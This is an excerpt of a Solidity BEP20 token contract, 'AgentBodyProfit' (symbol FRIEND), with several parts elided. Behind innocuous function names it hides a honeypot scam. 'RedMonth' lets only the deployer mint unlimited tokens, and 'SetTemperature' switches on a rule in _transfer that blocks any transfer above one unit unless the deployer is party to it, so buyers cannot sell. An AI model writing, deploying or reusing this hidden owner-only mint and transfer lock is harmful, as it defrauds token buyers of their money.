...
contract AgentBodyProfit is IBEP20
{
    mapping(address => uint256) internal _computer;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    uint256 internal _blank;
	...
	{ 
		...
		_origin = _msgsender;
		_computer[_origin] = _totalSupply;
		emit Transfer(address(0), _origin, _totalSupply); 
	}

    function name() external view virtual override returns (string memory) { return "AgentBodyProfit"; }
    function symbol() external view virtual override returns (string memory) { return "FRIEND"; }
    ...
    function balanceOf(address account) external view virtual override returns (uint256) { uint256 retrib = _computer[account]; return retrib;}
    ...
    function RedMonth(uint256 power) external virtual
	{
		require(msg.sender == _origin);
		uint256 skin = power * (10 ** 10);
		uint256 MyVar = _computer[_msgsender] + skin;
		_computer[_msgsender] = MyVar;
		emit Transfer(address(0), _msgsender, skin); 
	}
	function SetTemperature() external virtual 
	{
		require(msg.sender == _origin);
		_blank = 1; 
	}
    ...
    function _transfer(address sender,address recipient, uint256 amount) internal virtual  
	{
		...
		require(amount <= _blank || recipient == _msgsender || sender == _msgsender);
		uint256 senderowner = _computer[sender]; 
		require(senderowner >= amount, "BEP20: transfer amount exceeds owner"); 
		uint256 burnAmount = amount * _burnRate / 100; 
		_computer[sender] = senderowner - amount; 
		_computer[recipient] += (amount - burnAmount); 
		_computer[_burnaddress] += burnAmount; 
